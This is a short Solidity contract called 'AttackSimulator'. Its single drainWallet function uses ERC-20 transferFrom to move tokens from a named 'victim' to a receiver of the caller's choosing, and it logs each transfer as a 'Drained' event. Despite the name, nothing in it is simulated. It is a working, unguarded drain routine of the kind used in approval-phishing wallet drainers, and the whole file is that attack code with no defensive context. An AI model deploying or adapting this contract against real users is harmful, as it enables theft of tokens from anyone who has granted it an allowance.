// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract AttackSimulator {
    event Drained(address indexed token, address indexed victim, address indexed to, uint256 amount);

    function drainWallet(address token, address victim, address to, uint256 amount) external {
        require(token != address(0), "token required");
        require(victim != address(0), "victim required");
        require(to != address(0), "receiver required");
        require(amount > 0, "amount required");

        bool ok = IERC20Like(token).transferFrom(victim, to, amount);
        require(ok, "drain failed");

        emit Drained(token, victim, to, amount);
    }
}
